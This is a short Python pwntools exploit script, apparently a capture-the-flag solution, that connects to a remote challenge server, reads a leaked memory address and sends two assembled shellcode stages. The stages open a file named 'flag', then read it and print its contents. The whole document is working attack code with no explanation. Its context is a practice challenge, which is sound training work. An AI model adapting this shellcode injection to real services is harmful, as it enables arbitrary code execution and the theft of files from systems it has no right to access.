from pwn import *
context.arch="amd64"
p=remote("tcp.espark.tn",5002)

p.recvuntil(b"-> ")

plate1=int(p.recvline().decode().strip(),16)

log.info(hex(plate1))


shellcode_two=asm(shellcraft.open("flag"))

shellcode_two+=asm("mov rdi, "+str(hex(plate1))+";call rdi",arch="amd64")


shellcode_one=asm(shellcraft.read('rax','rsp',200))

shellcode_one+=asm(shellcraft.write(1,'rsp',200))

print(hex(len(shellcode_one)))
print(hex(len(shellcode_two)))
p.sendline(shellcode_one)

sleep(1)

p.sendline(shellcode_two)

p.interactive()